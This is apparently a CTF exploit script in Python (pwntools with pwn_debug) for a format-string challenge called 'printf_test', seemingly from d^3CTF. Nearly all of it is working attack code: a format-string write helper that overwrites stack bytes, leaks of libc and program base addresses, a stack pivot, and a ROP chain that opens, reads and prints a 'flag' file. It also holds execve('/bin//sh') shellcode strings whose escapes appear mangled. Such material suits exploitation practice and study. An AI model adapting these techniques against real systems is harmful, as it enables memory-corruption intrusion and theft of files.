from pwn_debug import *
import time
pdbg=pwn_debug("printf_test")
pdbg.context.terminal=['tmux', 'splitw', '-h']
context.log_level='debug'
pdbg.local("")
pdbg.remote()

switch=1
if switch==1:
    p=pdbg.run("local")
elif switch==2:
    p=pdbg.run("debug")
elif switch==3:
    p=pdbg.run("remote")
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, ''))
uu64    = lambda data   :u64(data.ljust(8, ''))
bp      = lambda bkp                :pdbg.bp(bkp)
def bpp(m=[]):
    bp(m)
    input()
#elf=pdbg.elf
libc=pdbg.libc
sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x64_21="xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

ru('here is my gift: ')
stack_addr=int(ru('\n'),0)
print "stack_addr: "+hex(stack_addr)

def calc(offset,value,fmt='hhn'):
    return '%'+str(value)+'c%'+str(offset)+'$'+fmt+'\x00'


sl(calc(6,int(hex(stack_addr)[-2:],16)))
time.sleep(0.1)
sl(calc(10,0x20))
time.sleep(0.1)
sl(calc(9,0x540,'hn'))
time.sleep(0.1)
#bpp([0xb51])

sl('%15$p\x00')
ru('0x')
libc_base=int(r(12),16)-libc.sym['__libc_start_main']-240
print 'libc_base'+hex(libc_base)
time.sleep(0.1)
sl('%11$p\x00')
ru('0x')
pro_base=int(r(12),16)-0xb51
print 'pro_base'+hex(pro_base)
time.sleep(0.1)

buffer_addr=pro_base+0x202060+0x20
pop_rdx=0x0000000000001b92+libc_base
pop_rsp_3=0x0000000000000bbd+pro_base
pop_rdi=0x0000000000000bc3+pro_base
pop_rsi_1=0x0000000000000bc1+pro_base

flag_str_addr=buffer_addr+0xb8
flag_addr=buffer_addr+0xc0
func_open=libc.sym['open']+libc_base
func_read=libc.sym['read']+libc_base
func_write=libc.sym['write']+libc_base

rop_chain=flat([
    pop_rdi,
    flag_str_addr,
    pop_rsi_1,
    0,
    0,
    func_open,
    pop_rdi,
    1,
    pop_rsi_1,
    flag_addr,
    0,
    pop_rdx,
    0x30,
    func_read,
    pop_rdi,
    2,
    pop_rsi_1,
    flag_addr,
    0,
    pop_rdx,
    0x30,
    func_write
])

# stack pivot
# change ret addr
tmp=pop_rsp_3
for i in range(6):
    sl(calc(6,int(hex(stack_addr)[-2:],16)+0x30+i))
    time.sleep(0.1)
    sl(calc(10,tmp&0xff))
    tmp>>=8

tmp=buffer_addr-0x18
for i in range(6):
    sl(calc(6,int(hex(stack_addr)[-2:],16)+0x38+i))
    time.sleep(0.1)
    sl(calc(10,tmp&0xff))
    tmp>>=8
time.sleep(0.1)
sl(calc(6,int(hex(stack_addr)[-2:],16)+0x28))
time.sleep(0.1)
pay='d^3CTF\x00\x00'+'\x00'*0x18+rop_chain
pay=pay.ljust(0xd8,'\x00')+'flag\x00'
sl(pay)


#sl(calc(9,0x5))
it()

